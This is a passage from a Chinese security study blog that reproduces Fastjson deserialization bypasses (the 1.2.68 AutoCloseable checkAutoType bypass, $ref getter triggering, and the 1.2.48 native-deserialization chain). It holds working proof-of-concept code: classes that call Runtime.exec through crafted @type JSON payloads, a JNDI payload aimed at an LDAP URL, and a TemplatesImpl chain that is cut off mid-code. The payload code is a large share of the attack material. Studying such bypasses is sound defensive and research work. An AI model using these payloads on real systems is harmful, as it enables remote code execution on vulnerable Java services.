class="line"></span><br></pre></td></tr></table></figure><p>具体调试流程参考<a href="http://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p>文章收藏了</p><p>自己跟一下调用流程，声明一下我这里是从漏洞触发点去跟的不是按源码找的主要是记录复现这个绕过原理</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646627096-65b1de66-37bb-4625-8f23-4be22761f643.png" alt=""></p><p>可以看到已经是我们指定的autocloseable这个类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646669031-d2f6b90f-d037-4761-a22b-133d0197ff22.png" alt=""></p><p>这里就是一些常规判断，这里我们直接跳到关键点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646719667-953cbe96-d6f9-4456-8aba-bbe60db7812a.png" alt=""></p><p>这里从缓存中加载这个类<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646841434-9022cef2-acfa-47b9-8a03-55d01032e03d.png" alt=""></p><p>可以看到这个类是默认在mappings初始化会put进去的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646874613-20b75835-531a-4139-819f-98e16b8182ca.png" alt=""></p><p>然后就会直接返回</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646925822-2c45a7ee-f4c3-4320-ba4e-f3ce19bcfcb3.png" alt=""></p><p>接着，返回到DefaultJSONParser类中获取到clazz后再继续执行，根据java.lang.AutoCloseable类获取到反序列化器为JavaBeanDeserializer，然后应用该反序列化器进行反序列化操作：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733646973696-b531bd33-64f7-4989-a6db-cb2eaf27e3e9.png" alt=""></p><p>继续往下走<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647003075-cd63dae7-82ab-427e-bfc7-ef56378b8876.png" alt=""></p><p>会二次进入checkAutoType里ypeName参数是PoC中第二个指定的类，expectClass参数则是PoC中第一个指定的类：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647090986-11e4ca5e-311e-4904-954e-eacf3d13bc48.png" alt=""></p><p>继续向下跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647124197-c69d6540-ffa1-4140-8b9b-067b1f09101d.png" alt=""></p><p>这里因为autocloseable不在黑名单中会给赋值为true</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647217171-49045951-3927-4d6b-9607-4fbd7dcad6e7.png" alt=""></p><p>这里我们自定义的类是不在黑白名单中的所以没啥用继续向下走</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647268910-b347172e-7cc2-4fb3-aecc-31a433a5aa84.png" alt=""></p><p>走到这里面和上面一样继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647372854-bd3f54c2-c906-4da0-9834-c4ea6fd54b0f.png" alt=""></p><p>这里可以知道之前赋值为expectClassFlag为true所以会调用 loadClass去加载我们的恶意类</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647454391-99cccf27-f56f-4651-bd7a-92fa274145f7.png" alt=""></p><p>看看主要的逻辑就可以了，这里会加载恶意类返回</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647505791-56d708ae-1e4c-49b2-879a-8bf308800e02.png" alt=""></p><p>这里判断是否jsonType、true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647581692-4d696afc-4ec5-4f3c-8d88-22d4cd303af6.png" alt=""></p><p>前面的都能通过，往下，如果expectClass不为null，则判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733647645158-36095b47-faa8-4378-86a1-d1524a2321c3.png" alt=""></p><p>走出检查之后就会真正反序列化恶意类然后执行命令了</p><h3 id="记录下y4er师傅的payload">记录下y4er师傅的payload</h3><p>Runnable</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecRunnable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;    <span class="keyword">private</span> EvalRunnable eval;</span><br><span class="line">    <span class="keyword">public</span> EvalRunnable <span class="title function_">getEval</span><span class="params">()</span> &#123;        <span class="keyword">return</span> eval;    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEval</span><span class="params">(EvalRunnable eval)</span> &#123;        <span class="built_in">this</span>.eval = eval;    &#125;</span><br><span class="line">    <span class="meta">@Override</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvalRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> &#123;        System.out.println(<span class="string">&quot;EvalRunnable getCmd() &quot;</span>+cmd);        <span class="keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,cmd&#125;);        &#125; <span class="keyword">catch</span> (IOException e) &#123;            e.printStackTrace();        &#125;        <span class="keyword">return</span> cmd;    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;        <span class="built_in">this</span>.cmd = cmd;    &#125;</span><br><span class="line">    <span class="meta">@Override</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecRunnableMain</span> &#123;    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;: \&quot;org.heptagram.fastjson.ExecRunnable\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;eval\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.heptagram.fastjson.EvalRunnable\&quot;,\&quot;cmd\&quot;:\&quot;calc.exe\&quot;&#125;\n&quot;</span> +                <span class="string">&quot;&#125;&quot;</span>;        JSONObject.parseObject(payload);    &#125;&#125;</span><br></pre></td></tr></table></figure><p>Readable</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;<span class="keyword">import</span> java.nio.CharBuffer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecReadable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;    <span class="keyword">private</span> EvalReadable eval;</span><br><span class="line">    <span class="keyword">public</span> EvalReadable <span class="title function_">getEval</span><span class="params">()</span> &#123;        <span class="keyword">return</span> eval;    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEval</span><span class="params">(EvalReadable eval)</span> &#123;        <span class="built_in">this</span>.eval = eval;    &#125;</span><br><span class="line">    <span class="meta">@Override</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EvalReadable</span> <span class="keyword">implements</span> <span class="title class_">Readable</span> &#123;    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> &#123;        System.out.println(<span class="string">&quot;EvalReadable getCmd() &quot;</span>+cmd);        <span class="keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);        &#125; <span class="keyword">catch</span> (IOException e) &#123;            e.printStackTrace();        &#125;</span><br><span class="line">        <span class="keyword">return</span> cmd;    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;        <span class="built_in">this</span>.cmd = cmd;    &#125;</span><br><span class="line">    <span class="meta">@Override</span>    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">read</span><span class="params">(CharBuffer cb)</span> <span class="keyword">throws</span> IOException &#123;        <span class="keyword">return</span> <span class="number">0</span>;    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecReadableMain</span> &#123;    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;: \&quot;org.heptagram.fastjson.ExecReadable\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;eval\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.heptagram.fastjson.EvalReadable\&quot;,\&quot;cmd\&quot;:\&quot;calc.exe\&quot;&#125;\n&quot;</span> +                <span class="string">&quot;&#125;&quot;</span>;        JSONObject.parseObject(payload);    &#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="ref拓展使用">$ref拓展使用</h5><p>通过$ref引用功能，我们可以触发大部分getter方法，理论上当存在危险的method方法时我们可以通过此种方法在不开启AutoType的情况下来实现RCE，下面以threedr3am师傅提供的payload为例(代码部分取自Y4er师傅)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;<span class="keyword">import</span> org.apache.shiro.jndi.JndiLocator;<span class="keyword">import</span> org.apache.shiro.util.Factory;<span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefRCE</span>  &lt;T&gt; <span class="keyword">extends</span> <span class="title class_">JndiLocator</span> <span class="keyword">implements</span> <span class="title class_">Factory</span>&lt;T&gt;, AutoCloseable &#123;    <span class="keyword">private</span> String resourceName;</span><br><span class="line">                                                                                       <span class="keyword">public</span> <span class="title function_">RefRCE</span><span class="params">()</span> &#123;    &#125;</span><br><span class="line">                                                                                       <span class="keyword">public</span> T <span class="title function_">getInstance</span><span class="params">()</span> &#123;        System.out.println(getClass().getName() + <span class="string">&quot;.getInstance() invoke.&quot;</span>);        <span class="keyword">try</span> &#123;            <span class="keyword">return</span> (T) <span class="built_in">this</span>.lookup(<span class="built_in">this</span>.resourceName);        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unable to look up with jndi name &#x27;&quot;</span> + <span class="built_in">this</span>.resourceName + <span class="string">&quot;&#x27;.&quot;</span>, var3);        &#125;    &#125;</span><br><span class="line">                                                                                       <span class="keyword">public</span> String <span class="title function_">getResourceName</span><span class="params">()</span> &#123;        System.out.println(getClass().getName() + <span class="string">&quot;.getResourceName() invoke.&quot;</span>);        <span class="keyword">return</span> <span class="built_in">this</span>.resourceName;    &#125;</span><br><span class="line">                                                                                       <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setResourceName</span><span class="params">(String resourceName)</span> &#123;        System.out.println(getClass().getName() + <span class="string">&quot;.setResourceName() invoke.&quot;</span>);        <span class="built_in">this</span>.resourceName = resourceName;    &#125;</span><br><span class="line">                                                                                       <span class="meta">@Override</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;    &#125;&#125;</span><br></pre></td></tr></table></figure><p>载荷部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.heptagram.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefRCEMain</span> &#123;    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;@type\&quot;: \&quot;org.heptagram.fastjson.RefRCE\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;resourceName\&quot;: \&quot;ldap://localhost:1099/Exploit\&quot;,\n&quot;</span> +                <span class="string">&quot;  \&quot;instance\&quot;: &#123;\n&quot;</span> +                <span class="string">&quot;    \&quot;$ref\&quot;: \&quot;$.instance\&quot;\n&quot;</span> +                <span class="string">&quot;  &#125;\n&quot;</span> +                <span class="string">&quot;&#125;&quot;</span>;        System.out.println(json);        JSON.parse(json);</span><br><span class="line">                                                                    &#125;&#125;</span><br></pre></td></tr></table></figure><p>具体参考：<a href="https://mp.weixin.qq.com/s/DKG058MCQ8CEI_2ePe2s4g">https://mp.weixin.qq.com/s/DKG058MCQ8CEI_2ePe2s4g</a></p><h2 id="1-2-80bypass">1.2.80bypass</h2><p>参考：<a href="https://y4er.com/posts/fastjson-1.2.80">https://y4er.com/posts/fastjson-1.2.80</a></p><p>payload参考：<a href="https://github.com/su18/hack-fastjson-1.2.80">https://github.com/su18/hack-fastjson-1.2.80</a></p><h2 id="fastjson版本号如何确定">fastjson版本号如何确定</h2><p>参考：<a href="https://blog.csdn.net/m0_71692682/article/details/125814861">https://blog.csdn.net/m0_71692682/article/details/125814861</a></p><h2 id="fastjson原生反序列化1-2-48">fastjson原生反序列化1.2.48</h2><p>在前面学习的过程中其实也有注意到json在进行tosting方法时也会触发getter 方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">package com.ocean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class User &#123;</span><br><span class="line">    String name;</span><br><span class="line">    int age;</span><br><span class="line">    int <span class="built_in">id</span>;</span><br><span class="line">    public <span class="function"><span class="title">User</span></span>() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    public User(String name, int age, int <span class="built_in">id</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造&quot;</span>);</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">        this.id = <span class="built_in">id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String <span class="function"><span class="title">getName</span></span>() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get name&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set name&quot;</span>);</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int <span class="function"><span class="title">getAge</span></span>() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getage&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set age&quot;</span>);</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int <span class="function"><span class="title">getId</span></span>() &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get id&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> <span class="built_in">id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setId(int <span class="built_in">id</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set id&quot;</span>);</span><br><span class="line">        this.id = <span class="built_in">id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String <span class="function"><span class="title">toString</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;</span><span class="string">&#x27; +</span></span><br><span class="line"><span class="string">                &quot;, age=&quot; + age +</span></span><br><span class="line"><span class="string">                &quot;, id=&quot; + id +</span></span><br><span class="line"><span class="string">                &#x27;</span>&#125;<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733910477473-d92861e6-3e04-446a-b6fe-f2704325f70d.png" alt=""></p><p>可以看到测试出来的结果是先调用类的构造方法再去调用类中的getter方法。跟一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733911794039-c1f2c511-fc45-41c7-830d-7fae52156189.png" alt=""></p><p>这里会继续跟进几个toJSONString方法里直接略过到后面部分</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733911841190-8d882ee5-b48b-45ee-9e64-639401ec6a49.png" alt=""></p><p>会在最后一个toJSONString方法中调用write方法，我们跟进看看流程</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733911993693-aedabe35-d916-4561-8e62-d481c4b13409.png" alt=""></p><p>这里会去获取writer对象跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733912385459-0d5b3b2b-f301-4ecb-b01c-818f7f368cdb.png" alt=""></p><p>这里会调用SerializeConfig的getObjectWriter方法跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733912442600-314aac33-9880-4e96-ac11-4b8663e2259e.png" alt=""></p><p>这部分的流程就复杂了点但其实也没啥关键点，他这里会去获取我们的自定义类的writer对象但是一直都是空的继续跟到下面的逻辑里去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733912534445-f9897d4f-4c3e-471f-8761-5e5f08c44ac1.png" alt=""></p><p>这里就是会判断我们的类是不是他初始化时自定义的子类其实都不是继续向下走</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733912662751-463dfb19-6e31-4c4c-919f-4d61f65c90be.png" alt=""></p><p>这里会给我们创建序列化器然后返回我们的writer，继续走</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733912797718-998a0db2-17e9-4e17-8f3c-2072bb9dfadc.png" alt=""></p><p>会调用write方法这里是通过asm进行创建的具体可以看看下面这几篇师傅讲的</p><p>参考：<a href="https://mp.weixin.qq.com/s/KXVMe_F4u6jw60C6VZFIAA">https://mp.weixin.qq.com/s/KXVMe_F4u6jw60C6VZFIAA</a> （跟的挺细的可以看看）</p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95</a></p><p><a href="https://xz.aliyun.com/t/14896">https://xz.aliyun.com/t/14896</a></p><p>在引用y4师傅前面的话</p><p>:::tips<br>既然是与原生反序列化相关，那我们去fastjson包里去看看哪些类继承了Serializable接口即可，最后找完只有两个类，JSONArray与JSONObject，这里我们就挑第一个来讲(实际上这两个在原生反序列化当中利用方式是相同的)</p><p>首先我们可以在IDEA中可以看到，虽然JSONArray有implement这个Serializable接口但是它本身没有实现readObject方法的重载，并且继承的JSON类同样没有readObject方法，那么只有一个思路了，通过其他类的readObject做中转来触发JSONArray或者JSON类当中的某个方法最终实现串链</p><p>:::</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733913060988-cfbcf78c-4a90-4b41-97f6-5a00c53be716.png" alt=""></p><p>可以看到JSON类中是有toString方法的并且调用了toJSONString方法，而我们知道这个方法是会触发getter方法的。所以思路很明确了找到一个能够readObject的类，调用toString方法，然后调用toJSONString方法，再调用getter，实现反序列化利用。</p><p>看师傅们分析的博客发现是利用的cc5链的BadAttributeValueExpExeption中的readObject方法调用了toString方法进行调用，后半部分的get是利用链templates链进行动态加载因为</p><p>temaplates里有getOutputProperty方法可以触发。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733916463289-c0a099b1-3d2b-47f2-a3ad-1883025177a4.png" alt=""></p><p>可以看到BadAttributeValueExpExeption类中的readObject方法调用了toString方法。</p><h3 id="poc">poc</h3><p>maven依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">3.19</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"> &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span><span class="number">.48</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>fastjson1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span 